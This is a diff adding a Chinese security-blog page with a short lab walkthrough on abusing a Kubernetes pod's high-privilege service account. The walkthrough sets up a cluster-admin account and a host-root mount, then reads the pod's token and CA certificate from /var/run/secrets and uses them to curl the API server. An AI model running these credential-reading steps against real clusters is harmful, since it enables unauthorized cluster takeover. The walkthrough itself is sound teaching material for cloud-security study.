@@ -1,0 +1,212 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>利用Service Account连接API Server | 随风</title><meta name="author" content="随风"><meta name="copyright" content="随风"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="k8s有两种账户：用户账户和服务账户，用户账户被用于人与集群交互（如管理员管理集群），服务账户用于Pod与集群交互（如Pod调用api server提供的一些API进行一些活动） 如果我们入侵了一台有着高权限服务账户的Pod，我们就可以用它对应的服务账户身份调用api server向集群下达命令。默认的user或者service account并不具备任何权限,因为配置了RBAC权限。如运维配置不">
+<meta property="og:type" content="article">
+<meta property="og:title" content="利用Service Account连接API Server">
+<meta property="og:url" content="http://suifeng-kali.github.io/2025/03/21/%E5%88%A9%E7%94%A8Service-Account%E8%BF%9E%E6%8E%A5API-Server/index.html">
+<meta property="og:site_name" content="随风">
+<meta property="og:description" content="k8s有两种账户：用户账户和服务账户，用户账户被用于人与集群交互（如管理员管理集群），服务账户用于Pod与集群交互（如Pod调用api server提供的一些API进行一些活动） 如果我们入侵了一台有着高权限服务账户的Pod，我们就可以用它对应的服务账户身份调用api server向集群下达命令。默认的user或者service account并不具备任何权限,因为配置了RBAC权限。如运维配置不">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://suifeng-kali.github.io/assets/image-20250212143440-ujeqh00.png">
+<meta property="article:published_time" content="2025-03-21T08:30:00.000Z">
+<meta property="article:modified_time" content="2025-03-21T08:33:15.589Z">
+<meta property="article:author" content="随风">
+<meta property="article:tag" content="云安全">
+<meta property="article:tag" content="k8s">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://suifeng-kali.github.io/assets/image-20250212143440-ujeqh00.png"><link rel="shortcut icon" href="https://suifeng-kali.github.io/img/logo.jpg"><link rel="canonical" href="http://suifeng-kali.github.io/2025/03/21/%E5%88%A9%E7%94%A8Service-Account%E8%BF%9E%E6%8E%A5API-Server/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//fonts.googleapis.com" crossorigin=""/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Titillium+Web&amp;display=swap" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":380},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: {"limitCount":50,"languages":{"author":"作者: 随风","link":"链接: ","source":"来源: 随风","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。"}},
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  }
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '利用Service Account连接API Server',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2025-03-21 16:33:15'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+    win.getCSS = (url,id = false) => new Promise((resolve, reject) => {
+      const link = document.createElement('link')
+      link.rel = 'stylesheet'
+      link.href = url
+      if (id) link.id = id
+      link.onerror = reject
+      link.onload = link.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        link.onload = link.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(link)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 6.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://suifeng-kali.github.io/img/logo.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">28</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">22</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">9</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-book"></i><span> 目录</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友情连接</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于我</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg fixed" id="page-header" style="background-image: url('/assets/image-20250212143440-ujeqh00.png')"><nav id="nav"><span id="blog-info"><a href="/" title="随风"><span class="site-name">随风</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-book"></i><span> 目录</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友情连接</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于我</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">利用Service Account连接API Server</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-03-21T08:30:00.000Z" title="发表于 2025-03-21 16:30:00">2025-03-21</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-03-21T08:33:15.589Z" title="更新于 2025-03-21 16:33:15">2025-03-21</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E4%BA%91%E5%AE%89%E5%85%A8/">云安全</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">416</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>1分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="利用Service Account连接API Server"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><p>k8s有两种账户：用户账户和服务账户，用户账户被用于人与集群交互（如管理员管理集群），服务账户用于Pod与集群交互（如Pod调用api server提供的一些API进行一些活动）</p>
+<p>如果我们入侵了一台有着高权限服务账户的Pod，我们就可以用它对应的服务账户身份调用api server向集群下达命令。默认的user或者service account并不具备任何权限,因为配置了RBAC权限。如运维配置不当没有设置RBAC（基于角色的访问控制）,那么攻击者就可以通过Pod获取到Token进行API Server认证。在较低版本v1.15.11中,Kubernetes默认是不会开启RBAC控制，从1.16版本起，默认启用RBAC访问控制策略。从1.18开始，RBAC已作为稳定的功能。</p>
+<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>pod的serviceaccount信息一般存放于&#x2F;var&#x2F;run&#x2F;secrets&#x2F;kubernetes.io&#x2F;serviceaccount&#x2F;目录下</p>
+<p>​<img src="/assets/image-20250212142638-6enedmx.png" alt="image">​</p>
+<p>使用一个高权限的service account和一个Pod关联，模拟环境</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#创建账户</span><br><span class="line">kubectl create serviceaccount suifeng</span><br><span class="line">#把suifeng放入集群管理员组，给予高权限</span><br><span class="line">kubectl create clusterrolebinding cluster-admin-suifeng  --clusterrole=cluster-admin --serviceaccount=default:suifeng</span><br></pre></td></tr></table></figure>
+
+<p>然后将service account与pod相关联</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">apiVersion: v1</span><br><span class="line">kind: Pod</span><br><span class="line">metadata:</span><br><span class="line">  name: test</span><br><span class="line">spec:</span><br><span class="line">  serviceAccountName: suifeng</span><br><span class="line">  containers:</span><br><span class="line">  - name: test-444</span><br><span class="line">    image: nginx:1.14.2</span><br><span class="line">    volumeMounts:</span><br><span class="line">    - name: host</span><br><span class="line">      mountPath: /host</span><br><span class="line">  volumes:</span><br><span class="line">  - name: host</span><br><span class="line">    hostPath:</span><br><span class="line">      path: /</span><br><span class="line">      type: Directory</span><br></pre></td></tr></table></figure>
+
+<p>​<img src="/assets/image-20250212143345-wasssmg.png" alt="image">​</p>
+<p>创建pod</p>
+<p>​<img src="/assets/image-20250212143440-ujeqh00.png" alt="image">​</p>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>在pod里设置环境变量</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">CA_CERT=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt</span><br><span class="line">TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)</span><br><span class="line">NAMESPACE=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)</span><br></pre></td></tr></table></figure>
+
+<p>​<img src="/assets/image-20250212143940-csmr040.png" alt="image">​</p>
+<p>利用相关凭证对api发起请求</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl --cacert $CA_CERT -H &quot;Authorization: Bearer $TOKEN&quot; &quot;https://192.168.230.128:6443/version&quot;</span><br></pre></td></tr></table></figure>
+
+<p>​<img src="/assets/image-20250212150534-rx6nhee.png" alt="image">​</p>
+<p>‍</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="http://suifeng-kali.github.io">随风</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://suifeng-kali.github.io/2025/03/21/%E5%88%A9%E7%94%A8Service-Account%E8%BF%9E%E6%8E%A5API-Server/">http://suifeng-kali.github.io/2025/03/21/%E5%88%A9%E7%94%A8Service-Account%E8%BF%9E%E6%8E%A5API-Server/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://suifeng-kali.github.io" target="_blank">随风</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E4%BA%91%E5%AE%89%E5%85%A8/">云安全</a><a class="post-meta__tags" href="/tags/k8s/">k8s</a></div><div class="post_share"><div class="social-share" data-image="/assets/image-20250212143440-ujeqh00.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/2025/03/21/etcd%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/" title="etcd未授权访问"><img class="cover" src="/assets/image-20250212092602-17unpmv.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">etcd未授权访问</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2025/03/03/K8s-configfile-%E6%B3%84%E9%9C%B2/" title="K8s configfile 泄露"><img class="cover" src="/assets/image-20250210152523-zbtjm30.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2025-03-03</div><div class="title">K8s configfile 泄露</div></div></a></div><div><a href="/2025/03/03/K8s-API-Server%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/" title="K8s API Server未授权访问"><img class="cover" src="/assets/image-20250211094312-jv1rb7b.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2025-03-03</div><div class="title">K8s API Server未授权访问</div></div></a></div><div><a href="/2025/03/21/etcd%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/" title="etcd未授权访问"><img class="cover" src="/assets/image-20250212092602-17unpmv.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2025-03-21</div><div class="title">etcd未授权访问</div></div></a></div><div><a href="/2025/03/03/Docker-daemon2375%E7%AB%AF%E5%8F%A3%E5%85%AC%E7%BD%91%E6%9A%B4%E9%9C%B2/" title="Docker daemon2375端口公网暴露"><img class="cover" src="/assets/image-20250210112112-p4q20sr.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2025-03-03</div><div class="title">Docker daemon2375端口公网暴露</div></div></a></div></div></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://suifeng-kali.github.io/img/logo.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">随风</div><div class="author-info__description">记录与分享</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">28</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">22</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">9</div></a></div><a id="card-info-btn" href="/img/gzh.png"><i class="fa-brands fa-weixin"></i><span>关注我</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/suifeng-kali" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="/img/vx.jpg" target="_blank" title="VX"><i class="fa-brands fa-weixin" style="color: #1BCB53;"></i></a><a class="social-icon" href="https://space.bilibili.com/266524390?spm_id_from=333.1007.0.0" target="_blank" title="bilibili"><i class="fa-brands fa-bilibili" style="color: #F75887;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">在这分享分享自己的笔记，记录记录生活。</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-number">1.</span> <span class="toc-text">环境搭建</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">2.</span> <span class="toc-text">漏洞利用</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2025/03/21/%E5%88%A9%E7%94%A8Service-Account%E8%BF%9E%E6%8E%A5API-Server/" title="利用Service Account连接API Server"><img src="/assets/image-20250212143440-ujeqh00.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="利用Service Account连接API Server"/></a><div class="content"><a class="title" href="/2025/03/21/%E5%88%A9%E7%94%A8Service-Account%E8%BF%9E%E6%8E%A5API-Server/" title="利用Service Account连接API Server">利用Service Account连接API Server</a><time datetime="2025-03-21T08:30:00.000Z" title="发表于 2025-03-21 16:30:00">2025-03-21</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/03/21/etcd%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/" title="etcd未授权访问"><img src="/assets/image-20250212092602-17unpmv.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="etcd未授权访问"/></a><div class="content"><a class="title" href="/2025/03/21/etcd%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/" title="etcd未授权访问">etcd未授权访问</a><time datetime="2025-03-21T08:13:00.000Z" title="发表于 2025-03-21 16:13:00">2025-03-21</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/03/03/Docker-daemon2375%E7%AB%AF%E5%8F%A3%E5%85%AC%E7%BD%91%E6%9A%B4%E9%9C%B2/" title="Docker daemon2375端口公网暴露"><img src="/assets/image-20250210112112-p4q20sr.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Docker daemon2375端口公网暴露"/></a><div class="content"><a class="title" href="/2025/03/03/Docker-daemon2375%E7%AB%AF%E5%8F%A3%E5%85%AC%E7%BD%91%E6%9A%B4%E9%9C%B2/" title="Docker daemon2375端口公网暴露">Docker daemon2375端口公网暴露</a><time datetime="2025-03-03T12:18:00.000Z" title="发表于 2025-03-03 20:18:00">2025-03-03</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/03/03/K8s-API-Server%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/" title="K8s API Server未授权访问"><img src="/assets/image-20250211094312-jv1rb7b.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="K8s API Server未授权访问"/></a><div class="content"><a class="title" href="/2025/03/03/K8s-API-Server%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/" title="K8s API Server未授权访问">K8s API Server未授权访问</a><time datetime="2025-03-03T12:15:00.000Z" title="发表于 2025-03-03 20:15:00">2025-03-03</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/03/03/K8s-configfile-%E6%B3%84%E9%9C%B2/" title="K8s configfile 泄露"><img src="/assets/image-20250210152523-zbtjm30.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="K8s configfile 泄露"/></a><div class="content"><a class="title" href="/2025/03/03/K8s-configfile-%E6%B3%84%E9%9C%B2/" title="K8s configfile 泄露">K8s configfile 泄露</a><time datetime="2025-03-03T12:09:00.000Z" title="发表于 2025-03-03 20:09:00">2025-03-03</time></div></div></div></div></div></div></main><footer id="footer" style="background: black"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2025 By 随风</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"><script>function loadValine () {
+  function initValine () {
+    const valine = new Valine(Object.assign({
+      el: '#vcomment',
+      appId: 'SB4PGikNZrP3JAMCBJNWM9eC-gzGzoHsz',
+      appKey: 'DIgUpJL30T7a2KTMRAWkD2Zq',
+      avatar: 'monsterid',
+      serverURLs: '',
+      emojiMaps: "",
+      path: window.location.pathname,
+      visitor: false
+    }, null))
+  }
+
+  if (typeof Valine === 'function') initValine() 
+  else getScript('https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js').then(initValine)
+}
+
+if ('Valine' === 'Valine' || !false) {
+  if (false) btf.loadComment(document.getElementById('vcomment'),loadValine)
+  else setTimeout(loadValine, 0)
+} else {
+  function loadOtherComment () {
+    loadValine()
+  }
+}</script></div><script id="click-show-text" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/click-show-text.min.js" data-mobile="true" data-text="I,LOVE,YOU,RedTeam,POC,EXP,Payload,SQLi,XSS,CSRF,XXE,Hack,Security,Sqlmap,Nmap,BurpSuite,Java,Python,Web,RCE,Root,Id,Whoami,CobaltStrike,Metasploit" data-fontsize="15px" data-random="true" async="async"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div class="no-result" id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></div></body></html>
